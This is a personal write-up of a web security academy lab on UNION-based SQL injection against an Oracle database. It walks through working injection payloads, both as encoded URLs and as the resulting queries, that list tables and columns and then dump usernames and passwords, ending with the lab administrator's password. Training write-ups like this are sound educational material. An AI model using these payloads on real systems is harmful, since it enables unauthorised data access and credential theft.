# Lab: SQL injection attack, listing the database contents on Oracle
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

## Examining an Oracle database
List the tables of the database:
```sql
SELECT * FROM all_tables
```

List the columns of a table called 'Users':
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

## Solution
The structure of the database is the same again, so we will skip the UNION attack validation here. Also the responses are pretty much the same like in the task with a MySQL database, so I will also skip the screenshots.

First we have to get the name of the user table:
```
https://0aae00dd03f73ef6819e4dd700f70047.web-security-academy.net/filter?category=Accessories%27+union+select+null,table_name+from+all_tables+--+
```

The query can look like this:
```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT NULL,table_name FROM all_tables --
```

In the response we find all table of the database. The table we are looking for is probably the table `USERS_RHNTCV`.

Next step is to find out the column names of the table:
```
https://0aae00dd03f73ef6819e4dd700f70047.web-security-academy.net/filter?category=Accessories%27+union+select+null,column_name+from+all_tab_columns+where+table_name=%27USERS_RHNTCV%27+--+
```
This creates the following query:
```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_RHNTCV' -- 
```

The response shows us the columns `PASSWORD_HBXKXZ` and `USERNAME_XCFRQR`.

To query for the username password combinations, we use the following:
```
https://0aae00dd03f73ef6819e4dd700f70047.web-security-academy.net/filter?category=Accessories%27+union+select+PASSWORD_HBXKXZ,USERNAME_XCFRQR+from+USERS_RHNTCV+--+
```
```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT PASSWORD_HBXKXZ, USERNAME_XCFRQR FROM USERS_RHNTCV -- 
```

This gives us the administrator password `w6a26hjpmeqi1i2j5d5q`.

If we loging with those credentials, the lab is solved aswell.
